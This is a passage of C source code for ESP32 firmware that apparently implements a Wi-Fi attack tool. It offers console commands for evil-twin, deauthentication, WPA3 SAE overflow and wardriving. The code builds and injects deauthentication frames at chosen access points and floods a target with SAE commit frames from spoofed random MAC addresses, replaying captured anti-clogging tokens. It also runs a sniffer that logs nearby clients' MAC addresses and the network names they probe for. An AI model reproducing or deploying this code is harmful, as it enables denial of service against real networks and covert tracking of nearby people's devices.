    led_strip_config_t strip_cfg = {
        .strip_gpio_num            = NEOPIXEL_GPIO,
        .max_leds                  = LED_COUNT,
        .led_model                 = LED_MODEL_WS2812,
        .color_component_format = LED_STRIP_COLOR_COMPONENT_FMT_GRB,
        .flags.invert_out          = false,
    };

    // 2. LED Strip RMT configuration
    led_strip_rmt_config_t rmt_cfg = {
        .clk_src        = RMT_CLK_SRC_DEFAULT,
        .resolution_hz  = RMT_RES_HZ,
        .flags.with_dma = false,
    };

    // 3. strip instance
    ESP_ERROR_CHECK(led_strip_new_rmt_device(&strip_cfg, &rmt_cfg, &strip));



    ESP_ERROR_CHECK(nvs_flash_init());

    ESP_ERROR_CHECK(wifi_init_ap_sta());
    ESP_ERROR_CHECK(espnow_init()); 

    wifi_country_t wifi_country = {
        .cc = "PH",
        .schan = 1,
        .nchan = 14,
        .policy = WIFI_COUNTRY_POLICY_AUTO,
    };
    esp_err_t retC = esp_wifi_set_country(&wifi_country);
    if (retC != ESP_OK) {
           ESP_LOGE(TAG, "Failed to set Wi-Fi country code: %s", esp_err_to_name(retC));
    } else {
           ESP_LOGW(TAG, "Wi-Fi country code set to %s", wifi_country.cc);
    }


    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
     MY_LOG_INFO(TAG,"");
    MY_LOG_INFO(TAG,"Available commands:");
    MY_LOG_INFO(TAG,"  scan_networks");
    MY_LOG_INFO(TAG,"  show_scan_results");
    MY_LOG_INFO(TAG,"  select_networks <index1> [index2] ...");
    MY_LOG_INFO(TAG,"  start_evil_twin");
    MY_LOG_INFO(TAG,"  start_deauth");
    MY_LOG_INFO(TAG,"  sae_overflow");
    MY_LOG_INFO(TAG,"  start_wardrive");
    MY_LOG_INFO(TAG,"  start_sniffer");
    MY_LOG_INFO(TAG,"  show_sniffer_results");
    MY_LOG_INFO(TAG,"  show_probes");
    MY_LOG_INFO(TAG,"  sniffer_debug <0|1>");
    MY_LOG_INFO(TAG,"  stop");
    MY_LOG_INFO(TAG,"  reboot");

    repl_config.prompt = ">";
    repl_config.max_cmdline_length = 100;

    esp_console_register_help_command();
    register_commands();

    esp_console_dev_uart_config_t hw_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&hw_config, &repl_config, &repl));
 
    ESP_ERROR_CHECK(esp_console_start_repl(repl));
    vTaskDelay(pdMS_TO_TICKS(500));
    MY_LOG_INFO(TAG,"BOARD READY");
    vTaskDelay(pdMS_TO_TICKS(100));
}

void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count) {   
    if (applicationState == EVIL_TWIN_PASS_CHECK ) {
        ESP_LOGW(TAG, "Deauth stop requested in Evil Twin flow, checking for password, will do nothing here..");
        return;
    }

    if (!onlyDeauth) {
        //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
        //MY_LOG_INFO(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
        
        // Wait in smaller chunks to allow UART processing
        for (int wait = 0; wait < 300; wait += 50) {
            vTaskDelay(pdMS_TO_TICKS(50));
            if (operation_stop_requested) {
                return; // Exit early if stop requested
            }
        }
        //MY_LOG_INFO(TAG, "Finished waiting for ESP-NOW...");
    }

    //then, proceed with deauth frames on channels of the APs:
    // Use target_bssids[] directly to avoid index confusion after periodic re-scan
    for (int i = 0; i < target_bssid_count; ++i) {
        if (applicationState == EVIL_TWIN_PASS_CHECK ) {
            ESP_LOGW(TAG, "Checking for password...");
            return;
        }
        
        // Check for stop request
        if (operation_stop_requested) {
            ESP_LOGW(TAG, "Deauth: Stop requested, terminating...");
            return;
        }

        if (!target_bssids[i].active) continue;
        
        // Enhanced logging to debug BSSID mismatch issue
        // MY_LOG_INFO(TAG, "DEAUTH: Sending to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X (target_bssids[%d])",
        //         target_bssids[i].ssid, target_bssids[i].channel,
        //         target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
        //         target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], i);
        
        vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch
        esp_wifi_set_channel(target_bssids[i].channel, WIFI_SECOND_CHAN_NONE );
        vTaskDelay(pdMS_TO_TICKS(50)); // Short delay to ensure channel switch

        uint8_t deauth_frame[sizeof(deauth_frame_default)];
        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
        memcpy(&deauth_frame[10], target_bssids[i].bssid, 6);
        memcpy(&deauth_frame[16], target_bssids[i].bssid, 6);
        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
    }

}

//SAE WPA3 attack methods:

static int trng_random_callback(void *ctx, unsigned char *output, size_t len) {
    (void)ctx;
    esp_fill_random(output, len);
    return 0;
}

static int crypto_init(void) {
    int ret;
    const char *pers = "dragon_drain";

    mbedtls_entropy_init(&entropy);
    mbedtls_ctr_drbg_init(&ctr_drbg);

    // TRNG as entropy source
    ret = mbedtls_ctr_drbg_seed(&ctr_drbg,
                             trng_random_callback,
                             NULL,
                             (const unsigned char *) pers, strlen(pers));

    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ctr_drbg_seed failed: %d", ret);
        return ret;
    }

    mbedtls_ecp_group_init(&ecc_group);
    mbedtls_ecp_point_init(&ecc_element);
    mbedtls_mpi_init(&ecc_scalar);

    ret = mbedtls_ecp_group_load(&ecc_group, MBEDTLS_ECP_DP_SECP256R1);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_group_load failed: %d", ret);
        return ret;
    }

    ESP_LOGI(TAG, "Crypto context initialized with TRNG (secp256r1)");
    return 0;
}

/*
 * Random MAC for client overflow attack.
 */
static void update_spoofed_src_random(void) {
    esp_err_t ret = mbedtls_ctr_drbg_random(&ctr_drbg, spoofed_src, 6);
    if (ret != 0) {
        ESP_LOGE(TAG, "Unable to generate random MAC: %d", ret);
        return;
    }

    spoofed_src[0] &= 0xFE;  // bit multicast = 0
    spoofed_src[0] |= 0x02;  // locally administered = 1

    next_src = (next_src + 1) % NUM_CLIENTS;
}

// SAE Overflow attack task function (runs in background)
static void sae_attack_task(void *pvParameters) {
    wifi_ap_record_t *ap_record = (wifi_ap_record_t *)pvParameters;
    
    MY_LOG_INFO(TAG, "SAE overflow task started.");
    
    prepareAttack(*ap_record);
    int frame_count_check = 0;
    
    while (sae_attack_active) {
        // Check for stop request (check every 10 frames for better responsiveness)
        if (frame_count_check % 10 == 0) {
            if (operation_stop_requested || !sae_attack_active) {
                MY_LOG_INFO(TAG, "SAE overflow: Stop requested, terminating...");
                operation_stop_requested = false;
                sae_attack_active = false;
                applicationState = IDLE;
                
                // Clean up after attack
                esp_wifi_set_promiscuous(false);
                
                // Clear LED (ignore errors if LED is in invalid state)
                esp_err_t led_err = led_strip_clear(strip);
                if (led_err == ESP_OK) {
                    led_strip_refresh(strip);
                }
                
                break;
            }
            
            // Yield to allow UART console processing every 10 frames
            taskYIELD();
        }
        
        inject_sae_commit_frame();
        
        // Delay to allow UART console processing (50ms gives better responsiveness)
        vTaskDelay(pdMS_TO_TICKS(50));
        frame_count_check++;
    }
    
    // Clean up LED after attack finishes naturally (ignore LED errors)
    esp_err_t led_err = led_strip_clear(strip);
    if (led_err == ESP_OK) {
        led_strip_refresh(strip);
    }
    
    // Clean up after attack
    esp_wifi_set_promiscuous(false);
    
    sae_attack_active = false;
    sae_attack_task_handle = NULL;
    MY_LOG_INFO(TAG, "SAE overflow task finished.");
    
    // Free the allocated memory for ap_record
    free(pvParameters);
    
    vTaskDelete(NULL); // Delete this task
}

/*
Injects SAE Commit frame with spoofed source address.
This function generates a random scalar, computes the corresponding ECC point,
and constructs the SAE Commit frame with the spoofed source address.
 */

void inject_sae_commit_frame() {
    uint8_t buf[256];  
    memset(buf, 0, sizeof(buf));
    memcpy(buf, auth_req_sae_commit_header, AUTH_REQ_SAE_COMMIT_HEADER_SIZE);
    memcpy(buf + 4, bssid, 6);
    memcpy(buf + 10, spoofed_src, 6);
    memcpy(buf + 16, bssid, 6);

    buf[AUTH_REQ_SAE_COMMIT_HEADER_SIZE - 2] = 19;  // Placeholder: scalar size

    uint8_t *pos = buf + AUTH_REQ_SAE_COMMIT_HEADER_SIZE;
    int ret;
    size_t scalar_size = 32;

    do {
        ret = mbedtls_mpi_fill_random(&ecc_scalar, scalar_size, mbedtls_ctr_drbg_random, &ctr_drbg);
        if (ret != 0) {
            ESP_LOGE(TAG, "mbedtls_mpi_fill_random failed: %d", ret);
            return;
        }
    } while (mbedtls_mpi_cmp_int(&ecc_scalar, 0) <= 0 ||
             mbedtls_mpi_cmp_mpi(&ecc_scalar, &ecc_group.N) >= 0);

    ret = mbedtls_mpi_write_binary(&ecc_scalar, pos, scalar_size);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_mpi_write_binary failed: %d", ret);
        return;
    }
    pos += scalar_size;

    ret = mbedtls_ecp_mul(&ecc_group, &ecc_element, &ecc_scalar, &ecc_group.G, mbedtls_ctr_drbg_random, &ctr_drbg);
    if (ret != 0) {
        ESP_LOGE(TAG, "mbedtls_ecp_mul failed: %d", ret);
        return;
    }

    uint8_t point_buf[65];
    size_t point_len = 0;
    ret = mbedtls_ecp_point_write_binary(&ecc_group, &ecc_element, MBEDTLS_ECP_PF_UNCOMPRESSED, &point_len, point_buf, sizeof(point_buf));
    if (ret != 0 || point_len != 65) {
        ESP_LOGE(TAG, "mbedtls_ecp_point_write_binary failed: %d", ret);
        return;
    }

    memcpy(pos, point_buf + 1, 64);  // skip 0x04 prefix
    pos += 64;

    // Append token:
    if (actLength > 0 && anti_clogging_token != NULL) {
        *pos++ = 0x4C;           // EID
        *pos++ = actLength;      // Length

        memcpy(pos, anti_clogging_token, actLength);
        pos += actLength;
    }

    // Refresh MAC
    update_spoofed_src_random();

    size_t total_len = pos - buf;


    esp_err_t ret_tx = esp_wifi_80211_tx(WIFI_IF_STA, buf, total_len, false);
    if (ret_tx != ESP_OK) {
        ESP_LOGE(TAG, "esp_wifi_80211_tx failed: %s", esp_err_to_name(ret_tx));
    } else {
        //log the frame:
        //ESP_LOGD(TAG, "Injecting SAE Commit frame, total length: %d bytes", total_len);
        // for (size_t i = 0; i < total_len; i++) {
        //     printf("%02X ", buf[i]);
        // }
        //printf("\n");
        // Send the frame
    }

    if (frame_count == 0) start_time = esp_timer_get_time();
    frame_count++;

    if (frame_count >= 100) {
        int64_t now = esp_timer_get_time();
        double seconds = (now - start_time) / 1e6;
        double fps = frame_count / seconds;
        
        // Debug logging only (disabled by default to avoid UART spam)
        ESP_LOGD(TAG, "SAE Overflow: AVG FPS: %.2f", fps);
        
        framesPerSecond = (int)fps;
        frame_count = 0;
        if (framesPerSecond == 0) {
            vTaskDelay(pdMS_TO_TICKS(50));
        }
    }
}


void prepareAttack(const wifi_ap_record_t ap_record) {

    esp_wifi_set_channel(ap_record.primary, WIFI_SECOND_CHAN_NONE );

    //globalDataCount = 1;
    //globalData[0] = strdup((char *)ap_record.ssid);
    memcpy(spoofed_src, base_srcaddr, 6);
    memcpy(bssid, ap_record.bssid, sizeof(bssid));
    next_src = 0;
    if (crypto_init() != 0) {
        ESP_LOGE(TAG, "Crypto initialization failed");
        return;
    }

    //Enable promiscuous mode in order to listen to SAE Commit frames
    ESP_LOGI(TAG, "Enabling promiscuous mode for SAE Commit frames");
    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_callback_v1);
    esp_wifi_set_promiscuous(true);

}

void wifi_sniffer_callback_v1(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MGMT) {
        parse_sae_commit((const wifi_promiscuous_pkt_t *)buf);
    }
}


static void parse_sae_commit(const wifi_promiscuous_pkt_t *pkt) {
    const uint8_t *buf = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    // Ignore retransmission:
    if (buf[1] & 0x08) return;


    int tods_fromds = buf[1] & 0x03;
    int pos_bssid = 0, pos_src = 0;

    switch (tods_fromds) {
        case 0:
            pos_bssid = 16; pos_src = 10;  break;
        case 1:
            pos_bssid = 4;  pos_src = 10;  break;
        case 2:
            pos_bssid = 10; pos_src = 16;  break;
        default:
            pos_bssid = 10; pos_src = 24;  break;
    }

    // Check if the frame is addressed to the target BSSID
    if (memcmp(buf + pos_bssid, bssid, 6) != 0 ||
        memcmp(buf + pos_src, bssid, 6) != 0)
        return;

    // Beacon detection 
    if (buf[0] == 0x80) {
        //ESP_LOGI(TAG, "Beacon detected from AP");
        return;
    }

    // Searching for SAE Commit
    if (len > 32 && buf[0] == 0xB0 && buf[24] == 0x03 && buf[26] == 0x01) {
        if (buf[28] == 0x4C) {
            const uint8_t *token = buf + 32;
            int token_len = len - 32;

            if (anti_clogging_token) free(anti_clogging_token);
            anti_clogging_token = malloc(token_len);
            if (!anti_clogging_token) {
                ESP_LOGE(TAG, "Mem error: Unable to allocate memory for anti_clogging_token");
                actLength = 0;
                return;
            }

            memcpy(anti_clogging_token, token, token_len);
            actLength = token_len;

            char token_str[token_len * 3 + 1];
            for (int i = 0; i < token_len; i++)
                sprintf(&token_str[i * 3], "%02X ", token[i]);
            token_str[token_len * 3] = '\0';

            //ESP_LOGI(TAG, "  Token: %s", token_str);
        } else if (buf[28] == 0x00) {
            //ESP_LOGI(TAG, "SAE Commit without ACT");
        }
    }
}

// === SNIFFER HELPER FUNCTIONS ===

static bool is_multicast_mac(const uint8_t *mac) {
    // IPv6 multicast: 33:33:xx:xx:xx:xx
    if (mac[0] == 0x33 && mac[1] == 0x33) {
        return true;
    }
    // IPv4 multicast: 01:00:5e:xx:xx:xx
    if (mac[0] == 0x01 && mac[1] == 0x00 && mac[2] == 0x5e) {
        return true;
    }
    // Broadcast: ff:ff:ff:ff:ff:ff
    if (mac[0] == 0xff && mac[1] == 0xff && mac[2] == 0xff &&
        mac[3] == 0xff && mac[4] == 0xff && mac[5] == 0xff) {
        return true;
    }
    // General multicast (first bit of first octet is 1)
    if (mac[0] & 0x01) {
        return true;
    }
    return false;
}

static bool is_broadcast_bssid(const uint8_t *bssid) {
    return (bssid[0] == 0xff && bssid[1] == 0xff && bssid[2] == 0xff &&
            bssid[3] == 0xff && bssid[4] == 0xff && bssid[5] == 0xff);
}

static bool is_own_device_mac(const uint8_t *mac) {
    // Get our own MAC address
    uint8_t own_mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, own_mac);
    
    if (memcmp(mac, own_mac, 6) == 0) {
        return true;
    }
    
    // Also check AP interface MAC
    esp_wifi_get_mac(WIFI_IF_AP, own_mac);
    if (memcmp(mac, own_mac, 6) == 0) {
        return true;
    }
    
    return false;
}


static void add_client_to_ap(int ap_index, const uint8_t *client_mac, int rssi) {
    static uint32_t add_client_counter = 0;
    add_client_counter++;
    
    if ((add_client_counter % 10) == 0) {
        //printf("ADD_CLIENT_HEARTBEAT: Call %lu, AP index %d\n", add_client_counter, ap_index);
    }
    
    if (ap_index < 0 || ap_index >= sniffer_ap_count) {
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Invalid AP index %d (max: %d)", ap_index, sniffer_ap_count);
        }
        return;
    }
    
    sniffer_ap_t *ap = &sniffer_aps[ap_index];
    
    // Check if client already exists
    for (int i = 0; i < ap->client_count; i++) {
        if (memcmp(ap->clients[i].mac, client_mac, 6) == 0) {
            // Update existing client
            ap->clients[i].rssi = rssi;
            ap->clients[i].last_seen = esp_timer_get_time() / 1000; // ms
            if (sniff_debug) {
                MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Updated existing client %02X:%02X:%02X:%02X:%02X:%02X in AP %s (RSSI: %d)", 
                           client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5], 
                           ap->ssid, rssi);
            }
            return;
        }
    }
    
    // Add new client if space available
    if (ap->client_count < MAX_CLIENTS_PER_AP) {
        int index = ap->client_count++;
        memcpy(ap->clients[index].mac, client_mac, 6);
        ap->clients[index].rssi = rssi;
        ap->clients[index].last_seen = esp_timer_get_time() / 1000; // ms
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Added NEW client %02X:%02X:%02X:%02X:%02X:%02X to AP %s (RSSI: %d, total clients: %d)", 
                       client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5], 
                       ap->ssid, rssi, ap->client_count);
        }
    } else {
        if (sniff_debug) {
            MY_LOG_INFO(TAG, "[DEBUG] add_client_to_ap: Cannot add client - AP %s is full (%d/%d clients)", 
                       ap->ssid, ap->client_count, MAX_CLIENTS_PER_AP);
        }
    }
}

static void sniffer_process_scan_results(void) {
    if (!g_scan_done || g_scan_count == 0) {
        return;
    }
    
    MY_LOG_INFO(TAG, "Processing %u scan results for sniffer...", g_scan_count);
    
    // Clear existing sniffer data
    sniffer_ap_count = 0;
    memset(sniffer_aps, 0, sizeof(sniffer_aps));
    
    // Copy scan results to sniffer structure
    for (int i = 0; i < g_scan_count && i < MAX_SNIFFER_APS; i++) {
        wifi_ap_record_t *scan_ap = &g_scan_results[i];
        sniffer_ap_t *sniffer_ap = &sniffer_aps[sniffer_ap_count++];
        
        memcpy(sniffer_ap->bssid, scan_ap->bssid, 6);
        strncpy(sniffer_ap->ssid, (char*)scan_ap->ssid, sizeof(sniffer_ap->ssid) - 1);
        sniffer_ap->ssid[sizeof(sniffer_ap->ssid) - 1] = '\0';
        sniffer_ap->channel = scan_ap->primary;
        sniffer_ap->authmode = scan_ap->authmode;
        sniffer_ap->rssi = scan_ap->rssi;
        sniffer_ap->client_count = 0;
        sniffer_ap->last_seen = esp_timer_get_time() / 1000; // ms
    }
    
    MY_LOG_INFO(TAG, "Initialized %d APs for sniffer monitoring", sniffer_ap_count);
}

static void sniffer_channel_hop(void) {
    if (!sniffer_active || sniffer_scan_phase) {
        return;
    }
    
    // Use dual-band channel hopping (like Marauder)
    sniffer_current_channel = dual_band_channels[sniffer_channel_index];
    
    sniffer_channel_index++;
    if (sniffer_channel_index >= dual_band_channels_count) {
        sniffer_channel_index = 0;
    }
    
    esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
    sniffer_last_channel_hop = esp_timer_get_time() / 1000;
    
    // Optional: Log channel changes with band info (debug mode)
    #if 0
    const char* band = (sniffer_current_channel <= 14) ? "2.4GHz" : "5GHz";
    MY_LOG_INFO(TAG, "Sniffer: Hopped to channel %d (%s)", sniffer_current_channel, band);
    #endif
}

// Task that handles time-based channel hopping (independent of packet flow)
static void sniffer_channel_task(void *pvParameters) {
    while (sniffer_active) {
        vTaskDelay(pdMS_TO_TICKS(50)); // Check every 50ms
        
        if (!sniffer_active || sniffer_scan_phase) {
            continue;
        }
        
        // Force channel hop if 250ms passed
        int64_t current_time = esp_timer_get_time() / 1000;
        bool time_expired = (current_time - sniffer_last_channel_hop >= sniffer_channel_hop_delay_ms);
        
        if (time_expired) {
            //MY_LOG_INFO(TAG, "Sniffer: Time-based channel hop (250ms expired)");
            sniffer_channel_hop();
        }
    }
    
    MY_LOG_INFO(TAG, "Sniffer channel task ending");
    vTaskDelete(NULL);
}

static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
    static uint32_t packet_counter = 0;
    static uint32_t last_debug_packet = 0;
    packet_counter++;
    
    if (!sniffer_active || sniffer_scan_phase) {
        return; // No debug logging here - too frequent
    }
    
    // Show packet count every 20 packets when debug is OFF
    if (!sniff_debug && (packet_counter % 20) == 0) {
        printf("Sniffer packet count: %lu\n", packet_counter);
    }
    
    // Perform packet-based channel hopping (10 packets OR time-based task will handle it)
    if ((packet_counter % 10) == 0) {
        //MY_LOG_INFO(TAG, "Sniffer: Packet-based channel hop (10 packets)");
        sniffer_channel_hop();
    }
    
    // Throttle debug logging - only every 100th packet when debug is on
    bool should_debug = sniff_debug && ((packet_counter - last_debug_packet) >= 100);
    if (should_debug) {
        last_debug_packet = packet_counter;
        printf("DEBUG_CHECKPOINT: Processing packet %lu\n", packet_counter);
    }
    
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    
    if (should_debug) {
        const char* type_str = (type == WIFI_PKT_MGMT) ? "MGMT" : 
                              (type == WIFI_PKT_DATA) ? "DATA" : 
                              (type == WIFI_PKT_CTRL) ? "CTRL" : "UNKNOWN";
        
        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Type=%s, Len=%d, Ch=%d, RSSI=%d", 
                   packet_counter, type_str, len, sniffer_current_channel, pkt->rx_ctrl.rssi);
        
        if (len >= 24) {
            MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Addr1=%02X:%02X:%02X:%02X:%02X:%02X, Addr2=%02X:%02X:%02X:%02X:%02X:%02X, Addr3=%02X:%02X:%02X:%02X:%02X:%02X",
                       packet_counter,
                       frame[4], frame[5], frame[6], frame[7], frame[8], frame[9],
                       frame[10], frame[11], frame[12], frame[13], frame[14], frame[15],
                       frame[16], frame[17], frame[18], frame[19], frame[20], frame[21]);
        }
    }
    
    // Filter only MGMT and DATA packets (like Marauder)
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) {
        // Skip logging for non-MGMT/DATA packets - too frequent
        return;
    }
    
    if (len < 24) { // Minimum 802.11 header size
        return; // Skip logging - too frequent
    }
    
    // Skip broadcast packets ONLY for DATA packets
    // MGMT packets (beacons, probe requests) normally have broadcast destinations
    bool is_broadcast_dest = (frame[4] == 0xff && frame[5] == 0xff && frame[6] == 0xff &&
                             frame[7] == 0xff && frame[8] == 0xff && frame[9] == 0xff);
    
    if (is_broadcast_dest && type == WIFI_PKT_DATA) {
        return; // Skip logging - too frequent
    }
    
    // Parse 802.11 header (like Marauder)
    uint8_t frame_type = frame[0] & 0xFC;
    uint8_t to_ds = (frame[1] & 0x01) != 0;
    uint8_t from_ds = (frame[1] & 0x02) != 0;
    
    // Extract addresses based on 802.11 standard
    uint8_t *addr1 = (uint8_t *)&frame[4];   // Address 1
    uint8_t *addr2 = (uint8_t *)&frame[10];  // Address 2  
    uint8_t *addr3 = (uint8_t *)&frame[16];  // Address 3
    
    if (sniff_debug) {
        // Minimal debug logging to avoid blocking
        printf("PKT_%lu: %s T=%d F=%d\n", packet_counter, 
               (type == WIFI_PKT_MGMT) ? "MGMT" : "DATA", to_ds, from_ds);
    }
    
    // Process MGMT packets for client detection (like Marauder)
    if (type == WIFI_PKT_MGMT) {
        if (should_debug) printf("DEBUG: Processing MGMT packet %lu\n", packet_counter);
        
        uint8_t *client_mac = NULL;
        uint8_t *ap_mac = NULL;
        bool is_client_frame = false;
        
        switch (frame_type) {
            case 0x80: // Beacon - update AP info only
                ap_mac = addr2; // Source is AP
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Beacon from AP: %02X:%02X:%02X:%02X:%02X:%02X", 
                               packet_counter, ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                // Update AP info if exists
                for (int i = 0; i < sniffer_ap_count; i++) {
                    if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                        sniffer_aps[i].last_seen = esp_timer_get_time() / 1000;
                        sniffer_aps[i].rssi = pkt->rx_ctrl.rssi;
                        break;
                    }
                }
                return; // Don't process beacons for client detection
                
            case 0x40: // Probe Request - client looking for networks
                client_mac = addr2; // Source is client
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Probe Request from client: %02X:%02X:%02X:%02X:%02X:%02X", 
                               packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
                }
                break;
                
            case 0x00: // Association Request - client trying to connect to AP
                client_mac = addr2; // Source is client
                ap_mac = addr1;     // Destination is AP
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Association Request from client %02X:%02X:%02X:%02X:%02X:%02X to AP %02X:%02X:%02X:%02X:%02X:%02X", 
                               packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                break;
                
            case 0xB0: // Authentication - client authenticating with AP
                client_mac = addr2; // Source is client
                ap_mac = addr1;     // Destination is AP
                is_client_frame = true;
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Authentication from client %02X:%02X:%02X:%02X:%02X:%02X to AP %02X:%02X:%02X:%02X:%02X:%02X", 
                               packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                               ap_mac[0], ap_mac[1], ap_mac[2], ap_mac[3], ap_mac[4], ap_mac[5]);
                }
                break;
                
            default:
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - Other MGMT frame type 0x%02X", packet_counter, frame_type);
                }
                return;
        }
        
        // Process client frames
        if (is_client_frame && client_mac) {
            // Skip multicast/broadcast client MAC
            if (is_multicast_mac(client_mac) || is_own_device_mac(client_mac)) {
                if (sniff_debug) {
                    MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: REJECTED - multicast or own device MAC", packet_counter);
                }
                return;
            }
            
            // For probe requests, extract SSID and store
            if (frame_type == 0x40) {
                // Parse probe request to extract SSID
                // Probe request format: MAC header (24 bytes) + Frame body
                // Frame body starts with fixed parameters, then tagged parameters
                // SSID is usually the first tagged parameter (Tag Number = 0)
                
                if (len > 24 && probe_request_count < MAX_PROBE_REQUESTS) {
                    const uint8_t *body = frame + 24; // Skip MAC header
                    int body_len = len - 24;
                    
                    char ssid[33] = {0};
                    bool ssid_found = false;
                    uint8_t ssid_length = 0;
                    
                    // Parse tagged parameters to find SSID (tag 0)
                    int offset = 0;
                    while (offset + 2 <= body_len) {
                        uint8_t tag_number = body[offset];
                        uint8_t tag_length = body[offset + 1];
                        
                        if (offset + 2 + tag_length > body_len) {
                            break; // Invalid tag
                        }
                        
                        if (tag_number == 0) { // SSID tag
                            ssid_length = tag_length;
                            if (tag_length > 0 && tag_length <= 32) {
                                memcpy(ssid, &body[offset + 2], tag_length);
                                ssid[tag_length] = '\0';
                                ssid_found = true;
                            } else if (tag_length == 0) {
                                strcpy(ssid, "<Broadcast>");
                                ssid_found = true;
                            }
                            break;
                        }
                        
                        offset += 2 + tag_length;
                    }
                    
                    // Store probe request if SSID found and not broadcast probe
                    if (ssid_found && ssid_length > 0) {
                        // Check if this MAC+SSID combination already exists
                        bool already_exists = false;
                        for (int i = 0; i < probe_request_count; i++) {
                            if (memcmp(probe_requests[i].mac, client_mac, 6) == 0 &&
                                strcmp(probe_requests[i].ssid, ssid) == 0) {
                                // Update existing entry
                                probe_requests[i].last_seen = esp_timer_get_time() / 1000;
                                probe_requests[i].rssi = pkt->rx_ctrl.rssi;
                                already_exists = true;
                                break;
                            }
                        }
                        
                        // Add new probe request if not exists
                        if (!already_exists) {
                            memcpy(probe_requests[probe_request_count].mac, client_mac, 6);
                            strncpy(probe_requests[probe_request_count].ssid, ssid, sizeof(probe_requests[probe_request_count].ssid) - 1);
                            probe_requests[probe_request_count].rssi = pkt->rx_ctrl.rssi;
                            probe_requests[probe_request_count].last_seen = esp_timer_get_time() / 1000;
                            probe_request_count++;
                            
                            if (sniff_debug) {
                                MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: Stored probe request for SSID '%s' from %02X:%02X:%02X:%02X:%02X:%02X", 
                                           packet_counter, ssid,
                                           client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
                            }
                        }
                    }
                }
                return; // Don't process probe requests for AP client association
            }
            
            // For association/auth requests, find or create the target AP
            if (ap_mac) {
                int ap_index = -1;
                for (int i = 0; i < sniffer_ap_count; i++) {
                    if (memcmp(sniffer_aps[i].bssid, ap_mac, 6) == 0) {
                        ap_index = i;
                        break;
                    }
                }
                
                // If AP not found, create it dynamically
                if (ap_index < 0 && sniffer_ap_count < MAX_SNIFFER_APS) {
                    ap_index = sniffer_ap_count++;
                    memcpy(sniffer_aps[ap_index].bssid, ap_mac, 6);
                    snprintf(sniffer_aps[ap_index].ssid, sizeof(sniffer_aps[ap_index].ssid), 
                            "MGMT_%02X%02X", ap_mac[4], ap_mac[5]);
                    sniffer_aps[ap_index].channel = sniffer_current_channel;
                    sniffer_aps[ap_index].authmode = WIFI_AUTH_OPEN;
                    sniffer_aps[ap_index].rssi = pkt->rx_ctrl.rssi;
                    sniffer_aps[ap_index].client_count = 0;
                    sniffer_aps[ap_index].last_seen = esp_timer_get_time() / 1000;
                    
                    if (sniff_debug) {
                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: CREATED new AP %s from MGMT frame", 
                                   packet_counter, sniffer_aps[ap_index].ssid);
                    }
                }
                
                if (ap_index >= 0) {
                    if (sniff_debug) {
                        MY_LOG_INFO(TAG, "[DEBUG] Packet #%lu: ACCEPTED - Adding client %02X:%02X:%02X:%02X:%02X:%02X to AP %s", 
                                   packet_counter, client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
                                   sniffer_aps[ap_index].ssid);
                    }
                    add_client_to_ap(ap_index, client_mac, pkt->rx_ctrl.rssi);
                } else {
                    if (sniff_debug) {
